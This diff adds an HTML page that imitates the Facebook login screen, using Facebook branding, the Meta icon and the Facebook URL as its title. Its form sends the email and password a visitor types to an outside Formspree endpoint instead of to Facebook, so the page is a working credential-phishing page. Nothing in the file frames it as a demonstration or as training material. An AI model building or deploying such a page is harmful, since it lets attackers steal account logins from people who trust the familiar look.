@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>https://www.facebook.com/</title>
+    <link rel="stylesheet" href="fb.css" />
+    <link
+      href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css"
+      rel="stylesheet"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: sans-serif;
+      }
+
+      body {
+        height: 100vh;
+        width: 100%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-color: rgba(228, 242, 248, 0.241);
+      }
+      .container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: row;
+        gap: 6rem;
+        height: 100%;
+        width: 100%;
+      }
+      .fb-text {
+        display: grid;
+        align-items: center;
+      }
+
+      .fb-text h1 {
+        color: rgb(0, 55, 255);
+        font-size: 2.5rem;
+        text-align: center;
+        margin-bottom: 1rem;
+      }
+
+      .forms {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem;
+        font-size: 1.2rem;
+        text-align: Center;
+      }
+      .forms h1 {
+        font-weight: 600;
+      }
+
+      .forms input {
+        padding: 01rem 2rem 1rem 2rem;
+        font-size: 1rem;
+        border-radius: 5px;
+        outline: none;
+      }
+      input:focus {
+        border: 1px solid #333;
+      }
+
+      a {
+        font-size: 0.8rem;
+        text-decoration: none;
+      }
+
+      button {
+        border-radius: 5px;
+        padding: 0.3rem;
+        font-size: 1.2rem;
+      }
+
+      .bxl-facebook-circle {
+        color: rgb(0, 55, 255);
+        text-align: center;
+        font-size: 70px;
+      }
+
+      .bxl-meta {
+        font-size: 50px;
+        margin-top: 0rem;
+        text-align: center;
+      }
+
+      @media screen and (max-width: 500px) {
+        .container {
+          gap: 1rem;
+          display: flex;
+          flex-direction: column;
+          padding: 1rem;
+        }
+        .bxl-meta {
+          margin-top: 4rem;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="fb-text">
+        <i class="bx bxl-facebook-circle"></i>
+        <h1>Facebook</h1>
+        <p>Connect with your friends and world.</p>
+      </div>
+      <form action="https://formspree.io/f/mrbzbqez" method="post">
+        <div class="forms">
+          <h1>Log in</h1>
+          <input
+            type="email"
+            name="name"
+            placeholder="Phone number or email address"
+          />
+          <input type="password" name="_ryplyto" placeholder="Password" />
+          <a href="#">Forgotten password?</a>
+          <button type="submit" value="Send">Log in</button>
+          <i class="bx bxl-meta"></i>
+          <h5>meta</h5>
+        </div>
+      </form>
+    </div>
+  </body>
+</html>
